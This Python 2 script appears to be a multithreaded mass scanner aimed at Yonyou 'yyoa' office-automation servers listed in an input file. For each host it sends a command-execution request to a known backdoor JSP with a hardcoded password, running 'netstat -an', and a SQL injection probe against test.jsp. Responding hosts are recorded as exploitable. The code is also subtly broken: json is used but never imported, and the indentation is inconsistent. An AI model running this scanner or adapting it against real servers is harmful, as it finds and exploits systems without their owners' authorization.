#!python
#-*- coding:utf8 -*-
# author			: glacier@insight-labs.org
# version			: v1.0

import os
import Queue
import threading
import requests
import socket
import httplib
import time
import urllib2

ipfile ='yyoa.txt'
exitFlag = 0
wr = open("./yyoaresult2.txt",'a')
result = []
socket.setdefaulttimeout(10)  #设置了全局默认超时时间
urllib2.socket.setdefaulttimeout(5) 

def my_urlencode(str) :
       reprStr = repr(str).replace(r'\x', '%')
       return reprStr[1:-1]

class ScannerThread(threading.Thread):
    def __init__(self,threadid, q):
        threading.Thread.__init__(self)
        self.tid = threadid
        self.q = q
    def run(self):
        scanner(self.q)



class RedirectHandler(urllib2.HTTPRedirectHandler):
    def http_error_301(self, req, fp, code, msg, headers):
        pass
    def http_error_302(self, req, fp, code, msg, headers):
        pass


def check_yyoa(url):
    html = ''
    #print(url)
    try:
        oaurl = url+"/yyoa/tuyhll.jsp?pwd=023&cmd=netstat%20-an"
        #print(oaurl)
        opener = urllib2.build_opener(RedirectHandler)
        response = opener.open(oaurl,timeout=5)
        try:
            html = response.read()
            html = json.loads(html)
            pass
        except:
            if (html and "LISTEN" in html) :
            	return oaurl
    except Exception, e:
        print(str(e))
    	return "error"
        pass
    return "error"
def check_yyoa2(url):
    html = ''
    try:
        oaurl = url+"/yyoa/common/js/menu/test.jsp?doType=101&S1=select@@version"
        opener = urllib2.build_opener(RedirectHandler)
        response = opener.open(oaurl,timeout=5)
        try:
            html = response.read()
            html = json.loads(html)
            print(html)
            pass
        except:

            if (html and "@@version" in html) :
            	return oaurl
    except Exception, e:
        print(str(e))
        return "error"
        pass
    return "error"


def scanner(q):
	while not exitFlag:
		if not workQueue.empty():
			queueLock.acquire()
			domain = q.get()
			queueLock.release()
			domain =domain.replace("\n","")
			if(domain !=''):
				oa1 = check_yyoa2("http://"+domain)
				#print(domain)
				if(oa1!="error"):
					print oa1 + "  is exist"
					wr.write(domain+"\n")
					result.append(oa1+"\n")
        oa2 = check_yyoa("http://"+domain)
        if(oa2!="error"):
          print oa2 + "  is exist"
          wr.write(domain+"\n")
          result.append(oa2+"\n")
	q.task_done()

queueLock = threading.Lock()
workQueue = Queue.Queue(10)
threads = []
tid = 0
# 创建新线程
for i in range(50):
    thread = ScannerThread(tid,workQueue)
    thread.start()
    threads.append(thread)
    tid = tid + 1

# 填充队列
with open(ipfile) as ips:
	for ip in ips:
		#print ip
		workQueue.put(ip)

# 等待队列清空
while not workQueue.empty():
    pass

# 通知线程是时候退出
exitFlag = 1

# 等待所有线程完成
for t in threads:
    t.join()

print result
wr.close()

#print "Exiting Main Thread"